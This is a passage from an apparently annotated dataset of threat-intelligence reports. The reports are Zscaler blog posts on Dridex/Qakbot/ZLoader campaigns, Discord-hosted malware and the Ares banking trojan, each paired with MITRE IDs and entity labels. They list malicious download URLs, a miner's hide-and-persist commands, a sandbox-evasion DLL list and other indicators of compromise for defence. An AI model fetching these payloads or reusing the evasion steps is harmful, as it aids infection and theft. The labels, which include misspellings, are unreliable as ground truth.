payloads for Dridex sub-botnets 10444 and 10555 as Microsoft Excel attachments.\nDridex continues using DLL files for the loader instead of Windows executables, a technique that has been recently employed by the Emotet and Qakbot threat groups as well.\nThere was another Dridex campaign with botnet 111 observed a day later, which was using the RIG exploit kit (EK).\nThe same RIG EK gate was used before the Christmas holiday.\n**Indicators - [Dridex IOCs](https://pastebin.com/Mxa6Bfad)**\n### **Qakbot**\nOn January 19, 2021, Qakbot emerged with a new spam campaign dropping a Qakbot payload with the campaign ID *abc118*.\nSimilar to Emotet, Qakbot is using reply chain spam email attacks.\nAn example is shown in Figure 4.\nQakbot was also seen using a \u201ccomplaint copy\" spam theme.\nQakbot spam campaigns are distributing malicious Excel files embedded inside a ZIP attachment.\nLike Emotet, Dridex, and ZLoader, Qakbot is using a DLL file for the loader instead of Windows executables.\nThis technique is now widely used by cybercriminals and is apparently able to evade security and sandbox solutions.\n![malspam](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/----category-images/botnets/figure4_qakbot_malspam.jpg)\n##### ***Figure 4****: Reply chain spam email distributing Qakbot*\n**Indicators - [Qakbot IOCs](https://pastebin.com/MdbbHFhg)**\n### **ZLoader**\nThreatLabZ observed new ZLoader activity on January 11,\u00a02021.\nThe botnet then went quiet, resuming with\u00a0another spam campaign on January 19.\nSo far in 2021, four different ZLoader campaigns have been observed, primarily targeting US\u00a0and EU banks and financial institutions.\n**Indicators - [ZLoader IOCs](https://pastebin.com/n4JR2CeZ)**\n### **Conclusion**\nCampaign frequency differs for\u00a0each malware family.\nSome have more regular\u00a0Monday through Thursday\u00a0cycles, while others, such as Emotet and Qakbot, are unpredictable.\nUsually, inactivity by cybercriminals or the absence of a malware strain is\u00a0a sign of impending changes.\nMalware authors continually adapt their techniques and change their code to improve distribution, persistence, evasion,\u00a0and overall success.\nThreatLabZ\u00a0continuously monitors activity from cybercrime gangs and their evolving malware strains,\u00a0integrating all threat intelligence into the Zscaler platform so it can be distributed cloud-wide to protect all customers around the world.", "mitre_ids": ["S0367", "S0266", "S0650", "S0367", "S0367", "S0367", "S0367", "TA0011", "TA0011", "S0367", "S0367", "S0367", "S0367", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "S0367", "T1566", "S0367", "T1566", "S0367", "S0367", "T1566", "S0367", "S0367", "T1566", "S0367", "T1566", "T1574", "S0367", "T1606", "T1114", "T1114", "T1114", "S0367", "S0266", "T1105", "S0367", "S0266", "S0367", "S0266", "T1105", "S0266", "S0575", "S0446", "T1486", "T1486", "S0367", "S0266", "T1105", "S0266", "S0266", "T1566", "T1059", "T1566", "T1059", "S0266", "T1059", "S0266", "S0266", "T1566", "T1566", "T1566", "S0367", "S0650", "S0650", "S0650", "S0650", "S0367", "S0650", "S0650", "T1566", "S0650", "T1566", "S0367", "S0650", "S0650", "T1566", "S0650", "S0367", "S0650", "TA0003", "TA0005", "TA0001"], "anno_name_label": [["MALWARE", "Dirdex"], ["MALWARE", "Zloader"], ["MALWARE", "Dirdex"], ["MALWARE", "Dirdex"], ["MALWARE", "Dirdex"], ["MALWARE", "Dirdex"], ["MALWARE", "Dirdex"], ["MALWARE", "Dirdex"], ["MALWARE", "RIG EK"], ["MALWARE", "RIG EK"], ["MALWARE", "Dirdex"], ["MALWARE", "Dirdex"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI"]}, {"cti_report": "Discord CDN: A Popular Choice for Hosting Malicious Payloads\nFebruary 09, 2021\n### **Introduction**\nSince the onset of the pandemic, the internet has become a central part of our lives.\nPeople of all ages turned online for school and work, to stream videos, to play video games, have virtual get-togethers, shop, talk to their doctor, and engage in any number of other activities.\nDuring 2020, [research](https://www.analyticsinsight.net/gaming-boom-in-covid-19-times-analysis-insights/) showed a sharp increase in game downloads, and this activity did not go unnoticed by cybercriminals.\nAttackers have often exploited the popularity of certain games ([Among Us](/blogs/security-research/among-us-imposter-google-play) was a recent example) to lure players into downloading fake versions that served malware.\nRecently, the Zscaler ThreatLabZ team noticed new campaigns in which cybercriminals are targeting gamers.\nThe key findings of our research include:\n* Multiple campaigns relying on the cdn.discordapp.com service for their infection chain.\n* Cybercriminals are using Discord CDN to host malicious files as well as for command-and-control (C&C) communication.\n* Malicious files are renamed as pirated software or gaming software to trick gamers.\n* File icons are also related to gaming software to trick gamers.\n* Multiple categories of malware are being served through the Discord app\u2019s CDN infrastructure - ransomware, stealers, and cryptominers.\nThe attack usually starts with spam emails in which users are tricked with\u00a0legitimate-looking templates into downloading next-stage payloads.\nIt\u2019s worth noting, however, that using Discord to host payloads is not new.\nThis campaign uses Discord services to form a URL to host malicious payloads as follows: *https://cdn.discordapp.com/attachments/ChannelID/AttachmentID/filename.exe*\n***![panel](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/zdf%20panel.PNG)***\n*Figure 1: Malicious files blocked in the Zscaler cloud\u00a0served via cdn.discordapp.com*\n### **Technical Analysis**\nDiscord is a chat application that allows users to chat with each other in real time.\nUsers can communicate with voice calls, chat messages, and video calls, and send files to one another.\nBut attackers also use Discord, often to distribute malicious files and steal information.\nThis CDN service was actually started as a content distribution network for serving static content to users, but it has revealed some considerable risks.\nFor example, an attacker can upload a malicious file on a Discord channel and share its public link with others\u2014**even non-Discord users can download it**.\nWorse, a file sent from Discord is there forever, so even if an attacker deletes a file within Discord, its link can still be used to download the malicious file.\n![final](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Final%20Diagram_0.jpg)\n*Figure 2: Infection chain of different malware on* cdn.dscordapp.com\nWe have seen multiple payloads being used in recent campaigns, primarily consisting of these four:\n1.Epsilon ransomware\n2.Redline stealer\n3.XMRig miner\n4.Discord token grabbers\n### **Epsilon ransomware**\n***(MD5: f509bd9e1fbd7721c95d0d19ba317b03)***\nWe have analyzed the Epsilon ransomware loader in which execution starts with dropping an .inf file and .exe file in the Windows/Temp folder.\nThe dropped payload performs the following actions upon execution.\n![Payload functionality](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Payload%20working.PNG)\n*Figure 3: Payload functionality*\n* persistence()\u00a0- Establishes persistence on the victim machine\n* encryptionStage() - Encrypt files\n* wallpap() - Download ransom image from Discord\n* extract() - Download ransom note from\u00a0Discord\n* sapi() - Display ransom note\n* x3() - Delete shadow copy(Recovery File)\n* clearmem() - Clean Memory\n* Exit() - Quit application\nThe malware establishes persistence by creating the follow registry key on the victim's machine:\n![Run key entry for persistence](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/persistence.PNG)\n*Figure 4: Run key entry for persistence*\nIt will enumerate through the the system drives\u00a0to encrypt the files using double encryption.\nFirst, it encrypts the files with AES encryption using a randomly generated 32-bit key.\nThen, those encrypted files will again be encrypted with the RC4 algorithm with a randomly generated 256-bit key.\n![Searching Drives for file encryption](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Drive.PNG)\n*Figure 5: Searching drives for file encryption*\nThe custom AES algorithm using 256-bit encryption.\n![CustomAES](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/CustomAES.PNG)\n*Figure 6: Custom AES algorithm*\nIt also uses custom RC4 encryption that has a 2048-bit variable-length key, whereas actual RC4 encryption uses a 256-bit variable-length key.\n![CustomRC4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/CustomRC4.PNG)\n*Figure 7: Custom RC4 algorithm*\nIt downloads the ransom note image from the cdn.discordapp.com link to show on the victim\u2019s machine upon successful encryption.\n![hta file](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/hta%20file.PNG)\n*Figure 8:\u00a0Downloading* READ\\_ME.hta *file*\nThe ransom note contains an email ID *[[email\u00a0protected]](/cdn-cgi/l/email-protection)[.]com* to communicate with the attacker for further information on payment and decryption key/software.\nThere is no C&C used by this ransomware variant.\n![ransomware note](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Readme.PNG)\n*Figure 9:\u00a0Epsilon ransomware note with email ID to contact attacker*\nThe ransomware deletes the shadow copies as well as the catalog to prevent victim from recovering the original\u00a0files which are now encrypted.\n![Deleting Shadow copy and catalog](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Shadow%20Copy.PNG)\n*Figure 10: Deleting shadow copy and catalog*\n### **Redline stealer**\n***(MD5: 67A29EF483B6A9485269D5B15A900119)***\nThe next file we saw during our analysis is a Redline stealer.\nThis stealer has been available on Russian underground forums since the first quarter of 2020 and is fairly new.\nIt\u2019s available as a standalone application and on a subscription basis with prices ranging from $100 to $300, depending upon the version and capabilities.\nWe have seen multiple samples of the Redline stealer blocked in the Zscaler cloud sandbox and below is our analysis of a recent sample written in .NET.\n**Redline Stealer Functionalities**\n* Collects login and passwords, cookies, autocomplete fields, credit cards\n* Data collection from FTP clients, IM clients\n* Customizable file-grabber based on path, extension\n* Customizable to not work in a blacklisted country\n* Collects information from the victim's machine: IP, country, city, current username, HWID, hardware information (video cards, processors), screenshot, screen resolution, keyboard layout, operating system, UAC settings, administrative privileges, user-agent, installed antiviruses\n* Downloads file from the URL to a specified location on the victim's machine\n* Process injection\n* Download and execute the file\n* Supports all browsers based on Chromium\n* Supports all Gecko-based browsers\nExecution starts with dropping a copy of itself into the AppData/Roaming folder.\nUnpacked binary shows the author making use of several popular gaming application names for internal functions.\n![Parent file disguised as Gaming File](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Desguise%20as%20game.PNG)\n*Figure 11: Redline stealer .NET function names using popular gaming applications.*\nThe stealer is capable of collecting data form several FTP and IM clients installed on the victim's machine as seen below:\n![igure xx: Data collection from FTP clients, IM clients](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/NordVPN%20grabing.PNG)\n*Figure 12: Data collection from FTP clients, IM clients*\nFigure 13 shows a module that is responsible for collecting information from browsers, such as stored cookies and credit card information.\n![Stealing Credit card info](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Credit%20card%20detail.PNG)\n*Figure 13: Stealing credit card info*\nIn addition to the functions to grab data from browser, FTP, and IM clients, the malware also steals victim's cryptocurrency wallet and collects victim's geolocation, hardware information, and Client IP address.\n**SOAP over HTTP for C&C**\nRedline stealer uses SOAP over HTTP for C&C communication.\nThe malware is developed in .NET framework where the use of SOAP becomes very easy and also provides the additional advantage of being independent of an underlying protocol.\n![Figure xx: Getting Config setting from CnC](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Pcap.PNG)\n*Figure 14: Getting config setting from C&C*\nAll the data being collected according to configuration settings is sent back to the C&C server.\n![Sending stolen client info](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Sending%20stolen%20info%20to%20server.PNG)\n*Figure 15: Sending stolen client info*\nAfter sending the collected data to the C&C server, the stealer is tasked with downloading and executing\u00a0additional payloads based on the victim's machine information.\n![Gets a Task from CnC server.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Sending%20request%20to%20server%20to%20get%20a%20task.PNG)\n*Figure 16: Receiving a task from the C&C server*\nThe remote task action module is used to download and execute the files as instructed by the C&C server.\n![Remote Task Action](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/remote-task%20action.PNG)\n*Figure 17: Remote task action*\n### **XMRig miner**\n***(**MD5:41F5CF39159295CFECE4D6B37BEB2D6D)***\nThe next malware we have been seeing in this ongoing campaign is XMRig miner.\nThe miner\u2019s execution starts by dropping a copy of itself at\n*%ProgramData%\\RealtekHDUpdater\\realtekdrv.exe*.\nThe malware also changes the file permissions using the following command:\n* *%ProgramData%*\\RealtekHDUpdater\" & ATTRIB +h +s +r\n* *%ProgramData%*\\RealtekHDUpdater\\cuda-helper.dll\"& ATTRIB +h +s +r\n* *%ProgramData%*\\RealtekHDUpdater\\nvrtc-builtins64\\_100.dll\"& ATTRIB +h +s +r\nThis is done to use the\u00a0miner capabilities without user permissions.\nThe malware connects to C&C server using the following command:\n* Cmd open *(class=\"de1\">)(.*)(</div></li>).https://pastebin(.)com/VKRXfjxX*, which yields *shgsqfdzin.000webhostapp.com*.\nNotice the usage of PasteBin URL to store the C&C server location.\nThe malware then\u00a0creates\u00a0a scheduled task:\n* /CREATE/SC MINUTE /MO 1/TN \"Realtek Updater\"\nThe miner also tries to delete some programs that can be used to detect the miner or impact its efficiency, such as games.\nThe following is the list of programs the miner tries to delete:\nProcess Hacker, Task Manager, Windows, Windows Task Manager, AnVir Task Manager, Taskmgr.exe, taskmgr.exe, procexp64.exe, procexp32.exe, perfmon.exe, procmon.exe, csgo.exe, dota2.exe, RainbowSix\\_Vulkan.exe, RainbowSix.exe, FortniteClient-Win64-Shipping.exe, EscapeFromTarkov.exe, Rust.exe, VALORANT.exe, Overwatch.exe, gta\\_sa.exe, GTA5.exe, Radeon, NVIDIA GeForce\nAfter this, the miner is launched using the following Monero address:\n*4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQswVtyKcWBsLoeY6A2*\n### **Discord token grabbers**\n***(MD5:5dd2400c3b6e3178eedde22c2427fda9)***\nCloud apps have become a mainstay for gamers just as they have for business and individual users.\nCloud apps are great for interactivity, but they can also be leveraged for malicious attacks.\nThe Discord token grabber is a broad term used to describe attacks that use Discord tokens to steal user information.\nIn this case, the stealer uses Discord app to steal data from the user and send it to a predetermined C&C server.\nBelow is the screenshot of\u00a0token grabber code extracted from a recent payload:\n![Stealer code](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Stealer%20code.png)\n*Figure 18: Stealer code*\nHere, the program collects user information, for example, *Environment.UserName*, and sends it over using a webhook defined in the *dcWebHook.WebHook* variable.\n![Json when the URI is visited](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Json%20when%20the%20URI%20is%20visited.png)\n*Figure 19: JSON response when the URI is visited*\n### **TroubleGrabber**\n***(******MD5: 2c178066d48d69dd56923343d338a376)***\nThis is a known stealer that uses Discord tokens to steal and send user data to its C&C.\nThis stealer both spreads and communicates through Discord app, using Discord URLs for attachments like *cdn[.]discordapp[.]com/attachments/[0-9]{18}/[0-9]{18}/Nameofattachment.rar*.\nThe name of the attachment can vary from being the name of a software application used by most users or cracked versions of games or tools, such as Discord Server Tool.exe, Galaxy Security Panel.exe, Vron Software.exe, CrackHub 2021.exe, or Vape V4 Cracked.exe.\nTroubleGrabber fetches payloads from https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator to begin its next stage after being executed in the victim's machine.\nThese files are as follows:\n*https://cdn[.]discordappp[.]com/attachments/797230131218874430/797241057136869446/sendhookfile[.]exe*\n*https://raw.githubusercontent.com/Itroublve/Token-Browser-Password-Stealer-Creator/master/AVOID%20ME/tokenstealer2[.]vbs*\n*https://cdn[.]discordapp[.]com/attachments/797230131218874430/797241059254992916/Token\\_Stealer[.]bat*\n*https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/raw/master/AVOID%20ME/WebBrowserPassView[.]exe*\n*https://github[.]com/Itroublve/Token-Browser-Password-Stealer-Creator/raw/master/AVOID%20ME/curl[.]exe*\n### **Coverage**\nThe malware payloads observed\u00a0in these campaigns\u00a0were successfully blocked by the Zscaler Cloud Sandbox.\n![Zscaler Cloud Sandbox report of Epsilon Ransomware](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Epsilon%20sandbox%20report.PNG)\n*Figure 20: Zscaler Cloud Sandbox report of Epsilon ransomware*\n![Zscaler Cloud Sandbox report of Redline Stealer](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Redline%20sandbox%20report.PNG)\n*Figure 21: Zscaler Cloud Sandbox report of Redline stealer*\n![Zscaler Cloud Sandbox report of XMRig miner](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/cdndiscord/Sandbox%20report%20of%20XMRig%20miner.png)\n*Figure 22: Zscaler Cloud Sandbox report of XMRig miner*\n**Detections:**\n[Win32.Ransom.Epsilon](https://threatlibrary.zscaler.com/?keyword=Win32.Ransom.Epsilon)\n[Win32.PWS.Redline](https://threatlibrary.zscaler.com/?keyword=Win32.PWS.Redline)\n[Win32.Coinminer.Xmrig](https://threatlibrary.zscaler.com/?keyword=Win32.Coinminer.Xmrig)\n[Win32.PWS.TroubleGrabber](https://threatlibrary.zscaler.com/?keyword=Win32.PWS.TroubleGrabber)\n### **Conclusion**\nDiscord is primarily a chatting platform built for gamers and is becoming increasingly popular among other professional communities for sharing information.\nWe\u2019re observing an increase in the usage of the Discord app to deliver malicious files by attackers.\nDue to the static content distribution service, it is highly popular among threat actors to host malicious attachments that remain publicly accessible even after removing actual files from Discord.\nThe Zscaler ThreatLabZ team will continue to monitor Discord-based malware campaigns to share the information with the community and to keep our customers safe.\n**MITRE ATT&CK:**\n| **ID** | **Tactic** | **Technique** |\n| T1078 | Valid Accounts | It uses valid account to access email\u00a0 |\n| T1107 | File Deletion | Self delete |\n| T1204 | User Execution | User interaction |\n| T1268 | Conduct social engineering | Uses social eng\u00a0to install payload |\n| T1489 | Service Stop | Stop critical services |\n| T1528 | Steal Application Access Token | Steal access token for valid account |\n| T1490 | Inhibit System Recovery\u00a0 | Delete shadow copies on a system |\n| T1222 | File Directory Permissions Modification | Change directory permission to hide its file\u00a0 |\n| T1555 | Credentials from password store | Steal stored password |\n| T1056 | Keylogging | Keylog of infected machine\u00a0 |\n| T1055 | Process Injection | Inject code into other process |\n**Indicators of Compromise**\n| MD5 | Malware Name | Malicious URLs / C&C |\n| f509bd9e1fbd7721c95d0d19ba317b03 | Epsilon Ransomware | https://cdn.discordapp[.]com/attachments/599226424695455755/800470210456846366/TaskHostHelper.exe |\n| 77d69cda0eebcd83f3a5e48d5f46a0d6 | Epsilon Ransomware | https://cdn.discordapp[.]com/attachments/599226424695455755/800087465523675176/65QEF.bmp |\n| 384c8470e59de327922bc5b8bc70c5f7 | Epsilon Ransomware | https://cdn.discordapp[.]com/attachments/599226424695455755/798932401216552974/READ\\_ME.hta |\n| efd0d1bd1e2bd38644a856707e0736ee | Redline Stealer | hxxps://cdn.discordapp[.]com/attachments/789938122951098380/791391319288184832/Outwith.exe |\n| 67a29ef483b6a9485269d5b15a900119 | Redline Stealer | https://cdn.discordapp[.]com/attachments/791427246031241270/797113668583948288/UpdaterMicrosoft.exe |\n| 4f5a53d149b343503c090601552468b1 | XMRig Miner | hxxp://cdn.discordapp[.]com/attachments/789938122951098380/791391327693832202/frost-miner-pro-v1.2.exe |\n| add4a9d06d21a044336462ff9871739f | XMRig Miner | hxxp://cdn.discordapp[.]com/attachments/553272395977195520/792811479073292298/crypted.exe |\n| 55c481a5eb77786ea4a12f8509301272 | XMRig Miner | hxxps://cdn.discordapp[.]com/attachments/553272395977195520/792811479073292298/crypted.exe |\n| b6d5b390d8248e95810e7af2e92faf5b | XMRig Miner | hxxps://cdn.discordapp[.]com/attachments/553272395977195520/797581786623901706/Summerset.exe |\n| 2c178066d48d69dd56923343d338a376 | Trouble Grabber | https://cdn.discordapp[.]com/attachments/799044673527611392/799045065116221490/Token\\_Stealer.bat |\n| 5dd2400c3b6e3178eedde22c2427fda9 | Discord Token Grabbers | http://207.32.216[.]211/peepee.exe |", "mitre_ids": ["T1608", "T1566", "TA0011", "T1102", "T1036", "T1036", "T1486", "TA0010", "T1496", "T1566", "T1608", "T1608", "T1608", "T1608", "T1566", "T1566", "T1496", "T1486", "T1486", "TA0002", "TA0003", "T1486", "T1105", "T1105", "T1491", "T1490", "T1490", "T1547", "T1547", "T1547", "T1083", "T1486", "T1486", "T1486", "T1083", "T1083", "T1486", "T1486", "T1486", "T1486", "T1486", "T1105", "T1491", "T1059", "T1491", "TA0011", "T1486", "TA0011", "T1486", "T1486", "T1486", "T1490", "T1486", "T1490", "T1490", "T1059", "T1606", "T1555", "TA0006", "T1119", "T1614", "TA0009", "TA0009", "T1033", "TA0009", "T1113", "TA0009", "TA0009", "T1105", "T1055", "TA0002", "TA0002", "T1059", "TA0009", "T1005", "T1005", "TA0009", "T1005", "T1555", "T1005", "T1555", "TA0011", "TA0011", "T1555", "TA0011", "T1071", "T1555", "T1059", "T1071", "TA0011", "TA0011", "TA0011", "T1041", "T1041", "TA0011", "T1041", "T1105", "T1082", "TA0011", "TA0011", "TA0011", "TA0011", "T1105", "T1496", "T1496", "T1496", "T1222", "T1222", "TA0011", "TA0011", "TA0011", "TA0011", "T1053", "T1496", "T1562", "T1562", "T1496", "TA0006", "TA0011", "T1041", "T1005", "T1033", "T1567", "TA0011", "T1102", "T1102", "T1036", "T1105", "T1059", "T1059", "T1496", "T1496", "T1608", "T1078", "T1204", "T1489", "T1528", "T1490", "T1222", "T1555", "T1056", "T1056", "T1055", "TA0011", "TA0011"], "anno_name_label": [["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Redline stealer"], ["TOOL", "xmrig miner"], ["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Redline stealer"], ["MALWARE", "Redline stealer"], ["MALWARE", "Redline stealer"], ["MALWARE", "Redline stealer"], ["TECHNIQUE", "Redline stealer"], ["MALWARE", "Redline stealer"], ["MALWARE", "Redline stealer"], ["TOOL", "xmrig miner"], ["TOOL", "xmrig miner"], ["MALWARE", "TroubleGrabber"], ["MALWARE", "TroubleGrabber"], ["TOOL", "curl"], ["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Redline stealer"], ["TOOL", "xmrig miner"], ["TOOL", "xmrig miner"], ["TECHNIQUE", "File Deletion"], ["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Epsilon Ransomware"], ["MALWARE", "Epsilon Ransomware"], ["TOOL", "xmrig miner"], ["TOOL", "xmrig miner"], ["TOOL", "xmrig miner"], ["TOOL", "xmrig miner"]], "cti_entity_class": ["CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Ares Malware: The Grandson of the Kronos Banking Trojan\nMarch 30, 2021\n*Kronos* is a banking trojan that first emerged in 2014 and marketed in underground forums as a crimeware kit to conduct credit card, identity theft, and wire fraud.\nIn September 2018, a new Kronos variant named [*Osiris*](https://www.proofpoint.com/us/threat-insight/post/kronos-reborn) introduced several new features including TOR for command and control (C2) communications.\nThe last update to Osiris appears to have been around mid-2019.\nIn February 2021, Zscaler ThreatLabz identified a new Kronos variant that surfaced via [spam campaigns to German speakers](https://blog.morphisec.com/long-live-osiris-banking-trojan-targets-german-ip-addresses), which calls itself *Ares*.\nIn Greek mythology, Ares is the son of Zeus and grandson of Kronos.\nThus, the naming convention appears to refer to this new malware variant as the third generation of Kronos.\nAres still\u00a0appears to be in development alongside an information stealer that harvests credentials from various applications including\u00a0VPN clients, web browsers, and the malware\u00a0can exfiltrate arbitrary files and cryptocurrency wallets.\nThe threat actor behind this new variant continues to use both Osiris and Ares in parallel.\nIn this blog post, we will examine these new malware developments and campaigns.\nDarkCrypter\n-----------\nRecent samples of Osiris and Ares have been protected by a malware packer written in C++ that calls itself *DarkCrypter*.\nThe packer contains the PDB path d:\\scm\\Italy\\dopplegang\\DarkCrypter\\Bin\\Clean.pdb.\nThe code is not related to the\u00a0commercial packer,\u00a0DarkCrypter, that has been [cracked and leaked online](https://github.com/0x4xLEAKR/DarkCrypter).\nInterestingly, the packer\u00a0shares code with Kronos and Osiris including the string encryption algorithm.\nWhen the string table is decrypted, the first 41 entries are identical to older Kronos variants with eight new string additions (shown below) to detect sandbox environments:\n```\natcuf32.dll\numengx86.dll\nsandboxie.dll\nlibctc\\_sandbox.dll\natcuf64.dll\nantimalware\\_provider32.dll\nantimalware\\_provider64.dll\nlibctc\\_onexecute.dll\n```\nIf the anti-analysis checks pass, the packer proceeds to the next step.\nThere are at least two variants of the packer.\nThe first variant decrypts the next-stage payload using Blowfish.\nHowever, the decryption process uses a non-standard Blowfish key size.\nTypically, Blowfish key sizes are between 4 bytes and 56 bytes.\nHowever, the Blowfish decryption implementation in DarkCrypter supports a hardcoded key size that is 288 bytes (although only the first 72 bytes are effectively used).\nThis may be designed to break cryptographic libraries that implement Blowfish and follow the standard, where the maximum key size is limited to 56 bytes.\nThe Blowfish key is located by computing a djb2 hash of each section name in the PE header.\nThe code compares the resulting hash value with two hardcoded values that map to the section names .text (0xb80c0d8) and .sjdata (0xecae6faa).\nThe second variant of the DarkCrypter packer embeds the second-stage payload in a compressed format rather than an encrypted Blowfish format.\nThe compression algorithm is identical to that found in Ares, and components related to\u00a0Ares, including a\u00a0packer that\u00a0impersonates a bitmap image header.\nModified UPX Packer\n-------------------\nThe threat actor has also experimented with modifying UPX headers, which has well known section names.\nThe modifications that have been made by the threat actor replace the UPX section names (UPX0, UPX1, ...\nwith standard section names like .text, .data, and .rdata.\nThis breaks compatibility with the command-line UPX decompression tool, although the file can still be decompressed and executed.\nAn example of the file header modifications are shown below in Figure 1 on the left, with the alterations highlighted in red.\n![](https://lh3.googleusercontent.com/owaei1eM_z78vTCELIKHH4FmYDriIDFcLrFkyOBIL151XGW7ZzpdkvVgYn62wfu1oYPIBn1YGbWmnScMOJ7DCOjLtgvtIGxt9IIqfGd1v6d9j-6JrLi5mL0be7On8CM_eMJNGqYp)\nFigure 1.\nModified and Restored UPX Headers\nThese changes can easily be restored to the original UPX section names as shown on the right in Figure 1.\nThe UPX command-line utility can then be used to statically unpack this binary, producing the final executable payload.\nBMPack\n------\nThe threat actor has also been using another packer that Zscaler ThreatLabZ has dubbed BMPack.\nThis packer has been utilized to pack both Osiris and Ares payloads.\nBMPack first decrypts embedded data using an XOR-based algorithm, followed by RC4.\nAfter the decryption stage, the file appears to be a bitmap image as shown in Figure 2.\n![](https://lh5.googleusercontent.com/sbBABN2Q0gubdZpL2lYzdNk2m4Nz-SAnlIjRXq8yMGWpvBP0bAPJ1DAQwwvZXN6PnwgNZBu_efNt7ggbDqv-teLdeS6YxqDE2ore8M1vq6VmntG-zw8XXLRx1RUBhuKNFwgvGF7V)\nFigure 2.\nFake Bitmap Image Used to Unpack\u00a0Osiris and Ares Malware\u00a0Payloads\nHowever, a closer inspection reveals that the data is not actually a bitmap image, but has a specific sequence of data structures.\nBy reverse engineering the packer, the format of the data structures can be determined, which consist\u00a0of three DWORD values that represent the compressed size (red), uncompressed size (green), next offset (blue), followed by the compressed data (orange).\nAn example of the first data structure is shown below in Figure 3.\n![](https://lh4.googleusercontent.com/vY6lhr-SrXFe6_ZPnecfAI6wPsuoBgFhDeXBCgqRU1TJNFIY1oZJuz4el7IvH04upoaS9cp7B6qwe3LSoPrk6S5sCpkaBI3H8uzI8qHKH7SNl3kFTaCF7axBgn8wHGI6eTjX0ZtO)\nFigure 3.\nFormat of BMPack Data Structures\nEach decompressed structure holds a different section of a PE file that is reconstructed and stitched together by a custom loader, and executed.\nAres Malware\n------------\nAres is being actively developed and the malware author continues to create and test new plugins and web injects.\nIn the most recent Ares samples, there is an embedded DLL module that is compressed within the binary.\nThe module contains an export that is designed to establish persistence.\nThe code first copies itself to the location %APPDATA%\\Adobe\\AdobeNotificationUpdates.exe.\nIt then creates a scheduled task named *AdobeNotificationUpdates* that is designed to execute Ares every two hours (with an expiration date of 2050-05-02 12:05:00).\nSimilar persistence code is also found in many DarkCrypter samples.\nThe Ares persistence module has the same compilation prefix as other modules in its PDB path 